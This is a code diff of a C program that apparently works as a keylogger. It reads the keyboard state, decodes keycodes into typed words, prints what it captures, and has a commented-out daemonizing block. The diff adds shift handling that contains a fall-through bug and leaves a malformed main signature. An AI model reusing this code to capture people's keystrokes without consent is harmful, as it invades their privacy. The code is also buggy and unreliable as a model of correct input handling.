@@ -30,14 +30,22 @@
 
 int fooling(unsigned char c) {
   switch(c) {
-    case 1: return 0;
-    case 2: return 1;
-    case 4: return 2;
-    case 8: return 3;
-    case 16: return 4;
-    case 32: return 5;
-    case 64: return 6;
-    case 128: return 7;
+  case 1: // alt
+    return 0;
+  case 2: // R ctrl
+    return 1;
+  case 4: // L shift, caps lock,
+    return 2;
+  case 8: 
+    return 3;
+  case 16: // alt gr,
+    return 4;
+  case 32:  // L ctrl, win, 
+    return 5;
+  case 64: // R shift
+    return 6;
+  case 128: // menu,
+    return 7;
   }
 }
 
@@ -45,35 +53,16 @@ void restore(int s) {
   die=1;
 }
 
-/*
-void handleKey(char* keyname, char* word, char* wp){
-  if(keyname == clear){
-    wp = word;
-    *wp = '\0';
-  } else if(keyname == bkspce){
-    if(wp != &word[0]){
-      wp--;
-      *wp = '\0';
-    }
-  } else if(keyname == ignore){
-    //nothing
-  } else {
-    *wp = *keyname;
-    wp++;
-    *wp = '\0';
-  }
-  //printf("%s, %x, %x\n", keyname, word, wp);
-  //printf("%s\n", word);
-}
-*/
-
 int main(int argc, char* argv) {
-  unsigned char ok[32];
-  unsigned char nk[32];
+  unsigned char ok[32]; // old key
+  unsigned char nk[32]; // new key
   int i;
   unsigned int keycode;
-  char word[100] = "\0";
-  char* wp = word;
+
+  char word[100] = "\0";  // word
+  char* wp = word;        // word pointer
+  
+  int shift = 0;
   
   //daemonizing it
   /*if (fork() < 0) {
@@ -208,7 +197,9 @@ int main(int argc, char* argv) {
             break;
           case 50:
           case 62: // "shift down";
+            shift = !shift;
           case 66: // "caps lock";
+            shift = !shift;
           case 37: // "control"
           case 135: // "menu"
           case 107: // "PrtSc"
@@ -253,29 +244,29 @@ int main(int argc, char* argv) {
           }            //printf("%s",keyname);
         } else {
           keycode=i*8+fooling(nk[i] ^ ok[i]);
-          /*
             switch(keycode){
             case 50:
             case 62:
-            printf("[shift up]");
-            break;
+              shift = !shift;
+              //printf("[shift up]");
+              break;
             case 37:
             case 105:
-            printf("[ctrl up]");
-            break;
+              //printf("[ctrl up]");
+              break;
             case 133:
-            printf("[win up]");
-            break;
+              //printf("[win up]");
+              break;
             case 108:
-            printf("[alt gr up]");
-            break;
+              //printf("[alt gr up]");
+              break;
             case 64:
-            printf("[alt up]");
-            break;
+              //printf("[alt up]");
+              break;
             }
-          */
         }
         ok[i]=nk[i];
+        printf("%s\n", word);
       }
     }
   }
